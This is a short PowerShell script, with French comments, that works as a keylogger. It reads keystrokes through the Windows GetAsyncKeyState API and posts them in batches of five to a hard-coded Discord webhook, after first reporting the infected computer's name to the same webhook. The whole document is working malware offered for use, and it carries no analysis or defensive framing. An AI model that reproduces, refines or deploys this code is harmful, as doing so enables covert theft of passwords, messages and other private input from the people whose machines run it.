$webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'

iwr $webhook -Method Post -Body (@{content="Keylogger natif lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null

$code = @'
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
}
'@

Add-Type $code

$buf = ''
while($true){
    Start-Sleep -m 30  # un peu plus rapide
    for($i=8;$i -le 254;$i++){
        if([K]::GetAsyncKeyState($i) -eq -32767){
            $buf += [char]$i
            if($buf.Length -ge 5){  # ← ENVOIE TOUTES LES 5 TOUCHES (au lieu de 25)
                iwr $webhook -Method Post -Body (@{content=$buf}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
                $buf = ''
            }
        }
    }
}
